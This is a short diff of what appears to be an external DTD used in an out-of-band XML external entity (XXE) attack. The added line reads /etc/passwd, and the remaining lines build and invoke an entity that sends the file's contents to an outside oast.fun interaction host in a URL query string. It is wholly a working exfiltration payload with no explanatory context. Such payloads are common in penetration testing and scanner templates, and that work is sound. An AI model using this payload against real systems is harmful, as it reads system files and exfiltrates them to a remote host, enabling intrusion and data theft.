@@ -1,3 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://hmeybzpqzyjabwvelxeeqkhxcvik1d0kw.oast.fun/?data=%file;'>">
 %all;
 %send;
